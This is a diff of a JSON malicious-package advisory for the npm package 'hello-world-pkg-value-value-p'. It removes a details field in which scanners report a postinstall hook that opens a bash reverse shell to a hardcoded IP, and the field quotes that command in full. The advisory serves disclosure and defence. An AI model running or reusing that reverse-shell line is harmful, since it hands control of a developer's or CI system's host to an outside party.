@@ -4,7 +4,6 @@
   "published": "2026-05-13T13:08:38Z",
   "modified": "2026-05-15T07:49:23.684092Z",
   "summary": "Malicious code in hello-world-pkg-value-value-p (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (d768990007f2926e3a58020102d277c3a604c6aa3bc70056cd466bc24437fc89)\nThis package's postinstall hook executes `node index.js`, which runs `execSync('bash -i >& /dev/tcp/52.249.218.132/8080 0>&1')` \u2014 an interactive bash reverse shell to the hardcoded attacker IP 52.249.218.132 on TCP port 8080. Any developer or CI system that runs `npm install hello-world-pkg-value-value-p` hands an interactive shell (running as the installing user) to whoever controls that IP. The package metadata is a meaningless-name cover story ('minimal npm...') with no legitimate functionality; the sole effect of installation is to open a remote shell on the installer's host. This is unambiguous unauthenticated RCE against the installer with no legitimate use case.\n\n## Source: ossf-package-analysis (0df4b35a2af7f4d8b4fdcda0dcb3e872deddb6a320bf6af8405b27f42ff413db)\nThe OpenSSF Package Analysis project identified 'hello-world-pkg-value-value-p' @ 1.0.11 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.\n",
   "affected": [
     {
       "package": {
